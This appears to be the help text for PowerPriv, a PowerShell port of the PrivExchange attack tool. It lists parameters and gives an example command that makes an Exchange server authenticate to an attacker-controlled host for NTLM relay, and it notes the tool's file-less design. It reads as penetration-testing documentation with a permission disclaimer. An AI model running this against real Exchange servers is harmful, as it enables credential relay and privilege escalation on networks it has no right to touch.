# PowerPriv

.DESCRIPTION
    A powershell implementation of PrivExchange by @_dirkjan (original code found here: https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py)
    Useful for environments on which you cannot run python-based applications or do not want to drop files to disk.  Will cause the target exchange server system account to attempt to authenticate to a system of your choice.
.PARAMETER targetHost
    Hostname or IP of the target exchange box.  Based on DNS config may require FQDN if using hostname. (Required)
.PARAMETER attackerHost
    Hostname or IP of a system you control, and are ideally running ntlmrelayx on.  We are telling the Exchange server to attempt to authenticate to this system.  Based on DNS config may require FQDN if using hostname. (Required)
.PARAMETER exchangePort
    Port to attempt to connect to Exchange server over. Default is 443.
.PARAMETER attackerPort
    Port Exchange should attempt to connect back to the attacker over.  Default is 80
.PARAMETER attackerPage
    Page we are telling the Exchange server to connect to on our attack system. Slashes are not required.  Default is powerPriv.
.PARAMETER noSSL
    Set to true if you dont want to use https to connect initially to the Exchange server.  Default is false (use https).
.PARAMETER Version
    Version of Exchange server we're targeting.  Default is 2013.
.EXAMPLE
    powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
.NOTES
    Author: @g0ldenGunSec  - Based on the tool created by @_dirkjan
    Only use this tool on networks you own or have permission to test against.   